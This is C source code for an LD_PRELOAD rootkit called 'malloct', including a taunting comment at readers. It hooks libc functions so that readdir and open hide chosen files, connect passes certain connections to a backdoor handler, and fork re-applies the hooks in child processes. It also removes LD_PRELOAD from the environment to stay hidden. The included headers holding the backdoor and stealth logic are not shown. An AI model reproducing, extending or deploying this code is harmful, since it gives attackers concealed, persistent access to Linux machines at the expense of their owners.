/* See LICENSE file for license details */
/* malloct - LD_PRELOAD rootkit */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "backdoor.h"
#include "stealth.h"
#include "hooks.h"
#include "config.h"

/* i see you been looking at malloct.c, you fucking freak)) */

static void init(void){
	init_hooks();
	unsetenv("LD_PRELOAD");
}

void* malloc(size_t s){
	if(!o_malloc) // init_hooks();
	init();
	return o_malloc(s);
}

void free(void* p){
	if(!o_free) init_hooks();
	o_free(p);
}

DIR* opendir(const char* n){
	if(!o_opendir) init_hooks();
	return o_opendir(n);
}

struct dirent* readdir(DIR* dp){
	if(!o_readdir) init_hooks();
	struct dirent* e;
	while((e = o_readdir(dp)) != NULL){
		if(!hide_file(e->d_name)){
			return e;
		}
	}

	return NULL;
}

int open(const char* pathn, int flags, ...){
	if(!o_open) init_hooks();
	if(hide_file(pathn)){
		errno = ENOENT;
		return -1;
	}

	mode_t mode = 0;
	if(flags & O_CREAT){
		va_list a;
		va_start(a, flags);
		mode = va_arg(a, mode_t);
	}

	return o_open(pathn, flags, mode);
}

int connect(int sockfd, const struct sockaddr* addr, socklen_t addrlen){
	if(!o_connect) init_hooks();
	if(is_backdoor_c(addr, addrlen)){
		return handle_bd(sockfd);
	}

	return o_connect(sockfd, addr, addrlen);
}

pid_t fork(void){
	if(!o_fork) init_hooks();
	pid_t p = o_fork();
	if(p == 0){
		init_hooks();
	}

	return p;
}
